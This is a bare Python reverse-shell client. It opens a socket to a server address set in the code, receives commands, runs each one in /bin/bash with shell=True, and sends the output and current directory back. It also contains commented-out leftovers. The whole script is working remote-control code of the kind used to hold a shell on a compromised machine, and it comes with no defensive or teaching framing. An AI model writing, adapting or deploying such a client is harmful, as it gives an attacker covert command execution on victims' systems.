#!/usr/bin/python3

import os
import socket
import subprocess
import signal
import sys
import time
import threading
#import code

#code.interact(local=locals())


# Create socket
def socket_create():
    try:
        global host
        global port
        global s
        host = '127.0.0.1' # Server ip goes here
        port = 5555
        s = socket.socket()
    except socket.error as msg:
        print("socket creation error: " + str(msg))


# Connect to a remote socket
def socket_connect():
    try:
        global host
        global port
        global s
        s.connect((host, port))
    except socket.error as msg:
        print("socket connection error: " + str(msg))


'''
# get the current working directory
wd = os.getcwd()

cmd = ""
while cmd != "exit":
    cmd = input(f"{wd}# ")
    try:
        cmd_list = cmd.split() # breakup the arguments into a list
        if cmd_list[0] == "cd": # command argument
            path = cmd_list[1] # path argument
            os.chdir(path) # now spawn a new process in a new directory
            wd = os.getcwd() # get the new working directory
        else:
            # all other commands will run against the current working directory
            result = s.run(cmd,stderr=sub.STDOUT,shell=True,cwd=wd) # notice the cwd named argument
    except:
        print("error")

print("exiting")
exit()
'''

# Receive commands and run 'em
# Receive commands from remote server and run on local machine
def receive_commands():
    global s
    while True:
        data = s.recv(1024)
        if data[:2].decode("utf-8") == 'cd':
            os.chdir(data[3:].decode("utf-8"))
        if len(data) > 0:
            cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, executable='/bin/bash')
            output_bytes = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_bytes, "utf-8")
            s.send(str.encode(output_str + str(os.getcwd()) + '> '))
            print(output_str)
    s.close()

''' # Doesnt work
# clean exit
def signal_handler(signal, frame):
    print('You pressed Ctrl+C!')
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)
print('Press Ctrl+C')
forever = threading.Event()
forever.wait()
'''

def main():
    socket_create()
    socket_connect()
    receive_commands()


if __name__ == "__main__":
   try:
      main()
   except KeyboardInterrupt:
      # do nothing here
      pass
